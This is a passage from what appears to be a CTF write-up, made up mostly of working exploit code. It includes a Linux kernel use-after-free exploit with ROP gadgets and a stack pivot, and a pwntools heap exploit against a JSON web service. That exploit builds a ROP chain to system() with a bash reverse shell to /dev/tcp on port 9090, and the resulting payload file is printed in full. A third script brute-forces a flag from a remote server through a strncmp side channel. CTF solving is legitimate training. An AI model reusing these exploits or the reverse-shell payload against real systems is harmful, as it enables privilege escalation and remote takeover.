            unsigned long prepare_kernel_cred = kernel_base + (0xffffffff8108c780 - 0xffffffff81000000);
            unsigned long pop_rdi = kernel_base + 0x16e9;
            unsigned long mov_rdi_rax = kernel_base + (0xffffffff813d7369 - 0xffffffff81000000);
            unsigned long mov_rdi_rax_rep = kernel_base + (0xffffffff81aed04b - 0xffffffff81000000);
            unsigned long pop_rcx = kernel_base + (0xffffffff8101ed83 - 0xffffffff81000000);
            unsigned long mov_cr3_rdi = kernel_base + (0xffffffff8105734a -0xffffffff81000000); //: mov cr3, rdi ; ret
            unsigned long or_rax_rdx = kernel_base + (0xffffffff81018d2c -0xffffffff81000000); //: or rax, rdx ; ret
            unsigned long pop_rdx = kernel_base + (0xffffffff8104abb7-0xffffffff81000000); // pop rdx; ret
            unsigned long pop_rax = kernel_base + (0xffffffff8100ec67-0xffffffff81000000); // pop rax; ret
            unsigned long mov_rax_cr3 = kernel_base + (0xffffffff81057fab-0xffffffff81000000); //: mov rax, cr3 ; mov cr3, rax ; ret
            unsigned long mov_cr3_rax = kernel_base + (0xffffffff81057fae - 0xffffffff81000000);//: mov cr3, rax ; ret
            unsigned long swapgs = kernel_base + (0xffffffff81c00f58 - 0xffffffff81000000);
            unsigned long iretq = kernel_base + (0xffffffff81024f92 - 0xffffffff81000000);
            unsigned long swapgs_restore = kernel_base + (0xffffffff81c00e26 - 0xffffffff81000000);
            /*
                       0xffffffff816e19bc:        mov    esp,0x83000000
                       0xffffffff816e19c1:        ret 
            */
            unsigned long pivot = kernel_base + 0x6e19bc;
            rop = mmap(0x83000000-(0x1000000/2), 0x1000000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
            for (int i = 0; i  0);
            ret = read(kmsg, b, 0x10000);
            assert(ret > 0);
            p = strchr(b, 0xff);
            leak = strtoul(p+1, NULL, 10);
            leak -= 0x1f3ecd;
            return leak;
    }
    int main(int argc, char *argv[])
    {
            char buf[0x81];
            int ret;
            unsigned long kernel_base;
            save_state();
            // open the target device driver.
            open_target();
            ret = ioctl(fd, ALLOC, 0x80);
            assert(ret == 0);
            //memset(buf, 'M', 0x80);
            strcpy(buf, "data : %lld %lld %lld %lld %lld \xff%lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld\n");
            ret = write(fd, buf, 0x80);
            assert(ret > 0);
            // Trying to printk that data we wrote.
            ret = ioctl(fd, GET, 0);
            assert(ret == 0);
            // trying to have the text base!
            if (argc == 1)
                    exit(1);
            else
                    kernel_base = strtoul(argv[1], NULL, 16) - 0x1f3ecd;
            //kernel_base = get_text_base();
            printf("Kernel base %lx\n", kernel_base);
            setup_chunk_rop(kernel_base);
            getchar();
            // trying to fill that freed chunk with struct subprocess_info
            // Trying to bruteforce it.
            //sleep(0.1);
            // Trying to free our chunk for UAD
            ret = ioctl(fd, UAF, 0);
            assert(ret == 0);
            pthread_t tid;
            pthread_create(&tid, NULL, memset_buf, kernel_base + 0x6e19bc);
            sleep(0.3);
            for(int i = 0; i '''%buf)
    def create_php2(buf):
        with open("pwnjson", 'wb+') as pf:
            pf.write(b'''%s'''%buf)
    context.arch = 'amd64'
    def pp64(num):
        payload = rb""
        for i in range(4):
            payload += rb"\\u" 
            tmp = bytes(hex((((num & 0xff) > 8) & 0xff)) & 0xffff)[2:],encoding='utf8').rjust(4,b'0')
            payload += tmp
            num = num >> 16
        return payload
    # print(pp64(0x1234))
    # pp64 = lambda x  : p64(x)[:6] + rb"\\u0000"
    libc = ELF('./libc-2.31.so')
    # libc_base = 0x7ffff7474000
    libc_base = 0x7faea6b33000
    rdx_gadget = libc_base + 0x000000000012c050
    rdi_ret = libc_base + 0x0000000000026796
    ret = 0x000000000002535f + libc_base
    rsi_ret = 0x000000000002890f + libc_base 
    rdx_ret = 0x00000000000cb1cd + libc_base
    # 0x555556606000
    # heap_base = 0x555556606000 + 0x1E1600
    heap_base = 0x56400792d000+ 0x1E1600
    free_hook = libc_base + libc.symbols["__free_hook"]
    shell_addr = libc_base + libc.symbols["__free_hook"]+ 0x140
    frame = SigreturnFrame()
    frame.rip = ret
    frame.rsp = heap_base + 0x640 + 0x100
    print(unpack_many(bytes(frame)))
    payload = rb'''
    {
        \"bb\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",
        \"aa\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",
        \"cc\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",
        \"dd\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",
        \"ee\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",
        \"ff\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",
        \"gg\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",
        \"ff\":\"aaaaaa\",
        \"ee\":\"aaaaaa\",
        \"dd\":\"aaaaaa\",
        \"zz\":\"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\\\"'''
    payload += rb"b" * 6 + pp64(0x51) + pp64(0) * 9
    # payload += pp64(0x31) + pp64(0) * 3
    payload += pp64(0x31) + pp64(free_hook - 0x30)
    # payload += b'b' * (0x80-2)
    # payload += p64(0x7ffff7635e70)[:6]
    # payload += rb"\\u0000"
    # payload += p64(0x7ffff7635e70)[:6]
    # payload += rb"\\u0000"
    # payload += p64(0x7ffff7635e70)[:6]
    # payload += rb"\\u0000"
    payload += rb'\",'
    payload +=rb'''
        \"address\":\"'''
    payload += rb'a' *0x20 + rb'\",'
    payload +=rb'''
        \"rop\":\"'''
    rop = pp64(rdi_ret) + pp64(shell_addr)  + pp64(rsi_ret) + pp64(0) + pp64(rdx_ret) + pp64(0)+ pp64(libc_base+libc.symbols['system'])
    payload += pp64(0) + pp64(heap_base + 0x640 + 0x10 - 0xC0 + 0x10) + pp64(0) * 2  +pp64(0)*2 + pp64(libc.symbols['setcontext'] + 53 + libc_base )
    payload += pp64(0) * 15 + pp64(heap_base + 0x640 + 0x108 - 0xc0 + 0x10) + pp64(ret) + pp64(0) + pp64(0x51) + pp64(0) * 7
    # payload += rop + rb'/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"'.replace(b' ',rb'\\u2020').replace(b"\"",rb'\\u2022')
    payload += rop + rb'/bin/touch /ctf/work/asddd'.replace(b' ',rb'\\u2020').replace(b"\"",rb'\\u2022')
    payload += rb'\",'
    payload +=rb'''
        \"rops\":\"'''
    payload += rb'a'*0x8 + pp64(free_hook + 0x10) +rb"\\\"" + rb"a"*(6+8 + 8) +rb'a' * 8+ pp64(rdx_gadget)  + pp64(libc.symbols['__free_hook'] + libc_base + 0x10) + pp64(0) * 2  +pp64(0)*2 + pp64(libc.symbols['setcontext'] + 53 + libc_base ) 
    # payload += bytes(frame)[0x28:].replace(b'\x00\x00',rb'\\u0000')
    payload += pp64(0) * 15 + pp64(libc_base + 0x1C1E70 + 0x108) + pp64(ret) + pp64(0) + pp64(0x51) + pp64(0) * 7 
    payload += rop + rb'/bin/bash -c "/bin/bash -i >&/dev/tcp/xxx.xx.xx.xx/9090 0>&1"'.replace(b' ',rb'\\u2020').replace(b"\"",rb'\\u2022')
    payload += rb'\",'
    payload +=rb'''
        \"rops\":\"'''
    payload += rb'a' *0x20 + rb'\",'
    payload += rb'''
    }
    '''
    # create_php(payload.replace(rb'\"',rb'"'))
    create_php(payload)
    create_php2(payload.replace(rb'\"',rb'"'))
然后将`pwnjson`里面的’\‘替换成’\’ 复制到文本框中点击发送即可
web服务堆环境很乱 需要多次爆破尝试.
pwnjson如下:
    {
        "bb":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "aa":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "cc":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "dd":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "ee":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "ff":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "gg":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "ff":"aaaaaa",
        "ee":"aaaaaa",
        "dd":"aaaaaa",
        "zz":"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\"bbbbbb\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u3100\u0000\u0000\u0000\u404e\ucfa6\uae7f\u0000",
        "address":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "rop":"\u0000\u0000\u0000\u0000\ua0eb\ub007\u4056\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u25e7\ub7a6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u98ec\ub007\u4056\u0000\u5f83\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u9697\ub5a6\uae7f\u0000\ub04f\ucfa6\uae7f\u0000\u0fb9\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\ucde1\ubfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u50be\ub7a6\uae7f\u0000/bin/touch\u2020/ctf/work/asddd",
        "rops":"aaaaaaaa\u804e\ucfa6\uae7f\u0000\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u50f0\uc5a6\uae7f\u0000\u804e\ucfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u25e7\ub7a6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u784f\ucfa6\uae7f\u0000\u5f83\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u9697\ub5a6\uae7f\u0000\ub04f\ucfa6\uae7f\u0000\u0fb9\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\ucde1\ubfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u50be\ub7a6\uae7f\u0000/bin/bash\u2020-c\u2020\u2022/bin/bash\u2020-i\u2020>&/dev/tcp/xxx.xxx.xxx.xx/9090\u20200>&1\u2022",
        "rops":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    }
###  Christmas Song
逆向scan.l 和 parser.y文件得到slang语言语法文法
通过call function open flag read flag 然后利用strncmp侧信道爆破flag
    from pwn import *
    import string
    context.log_level = 'debug'
    # sh = remote('124.71.144.133', 2144)
    payload = '''
    gift work is "12345678901234567890123456789012345678901234567890";
    gift path is "/home/ctf/flag";
    gift oflag is 0;
    gift temp is 0;
    gift Size is 48;
    gift fd is 0;
    gift flag is "{0}";
    gift Ans is 1;
    gift zero is 0;
    gift flagsize is {1};
    reindeer Dancer delivering gift path oflag temp brings back gift fd;
    reindeer Dasher delivering gift fd work Size;
    reindeer Prancer delivering gift work flag flagsize brings back gift Ans;
    this family wants gift Ans if the gift is Ans equal to zero : reindeer Rudolph delivering gift path oflag temp brings back gift fd; ok, they should already have a gift;
    EOF
    '''
    flag = 'SCTF{Merry'
    cnt  = 11
    stringset = string.printable
    while True:
        for i in stringset:
            temp = flag + i
            log.success(temp)
            sh = remote('124.71.144.133', 2144)
            sh.sendafter('(EOF to finish):', payload.format(temp, cnt))
            # log.success(payload.format(temp, cnt))
            try :
                sh.recvuntil('error:')
            except EOFError:
                sh.close()
            else:
                flag += i
                cnt += 1
                sh.close()
                break
        log.success('flag=' + flag)